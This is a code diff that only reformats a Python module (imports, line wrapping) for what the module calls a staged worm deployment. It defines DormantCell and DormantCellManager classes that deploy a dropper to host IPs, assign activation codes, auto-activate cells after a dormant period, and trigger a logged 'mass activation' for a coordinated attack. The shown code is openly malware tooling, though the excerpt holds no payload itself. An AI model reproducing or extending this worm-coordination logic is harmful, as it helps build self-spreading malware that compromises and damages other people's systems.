@@ -15,13 +15,13 @@ Instead of deploying the full worm immediately:
 4. Stage 4: All dormant cells activate simultaneously (coordinated attack)
 """
 
+import base64
+import hashlib
 import os
 import sys
 import time
-import hashlib
-import base64
-from typing import Dict, List, Optional, Callable
 from datetime import datetime
+from typing import Callable, Dict, List, Optional
 
 sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
@@ -43,9 +43,7 @@ class DormantCell:
 
     def __init__(self, host_ip: str, cell_id: str = ""):
         self.host_ip = host_ip
-        self.cell_id = (
-            cell_id or hashlib.md5(f"{host_ip}{time.time()}".encode()).hexdigest()[:12]
-        )
+        self.cell_id = cell_id or hashlib.md5(f"{host_ip}{time.time()}".encode()).hexdigest()[:12]
         self.stage = "dormant"
         self.deployed_at = datetime.now()
         self.activated_at = None
@@ -76,9 +74,7 @@ class DormantCell:
         # Auto-activate after max dormant period
         days_dormant = (datetime.now() - self.deployed_at).days
         if days_dormant >= self.max_dormant_days:
-            logger.info(
-                f"Cell {self.cell_id} auto-activating after {days_dormant} days dormant"
-            )
+            logger.info(f"Cell {self.cell_id} auto-activating after {days_dormant} days dormant")
             self._activate()
             return True
 
@@ -107,9 +103,7 @@ class DormantCell:
             "host_ip": self.host_ip,
             "stage": self.stage,
             "deployed_at": self.deployed_at.isoformat(),
-            "activated_at": self.activated_at.isoformat()
-            if self.activated_at
-            else None,
+            "activated_at": self.activated_at.isoformat() if self.activated_at else None,
             "days_dormant": (datetime.now() - self.deployed_at).days,
             "dropper_hash": self.dropper_hash,
         }
@@ -146,8 +140,7 @@ class DormantCellManager:
         cell.deploy_dropper(dropper)
 
         act_code = (
-            activation_code
-            or hashlib.md5(f"{host_ip}{time.time()}".encode()).hexdigest()[:16]
+            activation_code or hashlib.md5(f"{host_ip}{time.time()}".encode()).hexdigest()[:16]
         )
         cell.activation_signal = act_code
         self.activation_codes[cell.cell_id] = act_code
@@ -201,9 +194,7 @@ class DormantCellManager:
                     )
 
         if activated:
-            logger.success(
-                f"MASS ACTIVATION: {len(activated)} cells activated simultaneously"
-            )
+            logger.success(f"MASS ACTIVATION: {len(activated)} cells activated simultaneously")
 
         return activated
 
